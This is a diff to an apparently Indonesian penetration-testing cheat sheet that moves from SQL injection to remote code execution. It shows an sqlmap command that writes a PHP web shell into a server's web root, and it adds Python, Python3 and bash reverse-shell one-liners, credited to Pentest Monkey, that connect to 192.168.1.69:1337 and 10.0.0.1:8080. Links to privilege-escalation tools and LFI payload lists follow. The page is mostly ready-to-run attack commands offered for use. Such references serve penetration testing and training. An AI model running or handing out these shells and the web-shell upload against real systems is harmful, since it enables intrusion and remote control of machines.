@@ -30,10 +30,26 @@ SQLi to RCE
 sqlmap.py -u "http://192.168.1.69:6969/logs/search?q='" --file-write="C:\Users\MYUSER-FU\Downloads\shell.php" --file-dest="/var/www/html/shell.php"
 ```
 
+Reverse Shell dari Pentest Monkey 
+```bash
+September 4, 2011
+
+* Python dan Python3
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.69",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.69",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+* Bash | this was tested on Ubuntu 10.10
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+ 
+```
+
+
 
 * LinPEAS = https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
 * LES = https://github.com/The-Z-Labs/linux-exploit-suggester
 * GTFObins = https://gtfobins.org/gtfobins/
+* Pentest Monkey https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 * Payload LFI = https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/master/LFI%20payloads.txt
 * Cek https://medium.com/fmisec/injeksi-file-access-log-untuk-eskalasi-kerentanan-lfi-ke-rce-f0fc782b960d
 * Cek https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1/
